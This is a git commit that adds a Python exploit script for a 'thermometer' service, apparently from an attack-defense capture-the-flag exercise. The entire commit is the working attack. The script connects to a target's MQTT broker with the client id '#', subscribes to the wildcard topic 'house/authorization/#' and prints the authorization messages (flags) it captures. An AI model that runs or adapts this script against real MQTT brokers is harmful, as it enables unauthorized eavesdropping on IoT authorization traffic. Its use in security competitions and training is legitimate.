62c89dd5658e96c275f543b04389632388c36068
Artem Zinenko <Artem.Zinenko@kaspersky.com>
2017-05-12 17:30:02 +0300

    First exploit

---
+++ sploits/thermometer/thermometer.sploit.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python3
+
+import paho.mqtt.client as mqtt
+import sys
+from thermometer_module import ThermometerModule
+from mqtt_client import MqttClient
+
+def on_connect(client, userdata, flags, rc):
+    print("Connected to MQTT broker.")
+    client.subscribe("house/authorization/#")
+    print("Subscribed to topic 'house/authorization/#'.")
+    print("Waiting for flags...")
+
+def on_message(client, userdata, msg):
+    print(msg.payload)
+
+def exploit(host):
+    client = mqtt.Client(client_id="#", clean_session=True)
+    client.on_connect = on_connect
+    client.on_message = on_message
+
+    print("Connecting to MQTT broker on %s" % host)
+    client.connect(host, 1883, 60)
+    client.loop_forever()
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print('USAGE: %s <host>' % sys.argv[0])
+        exit(-1)
+
+    sys.exit(exploit(sys.argv[1]))
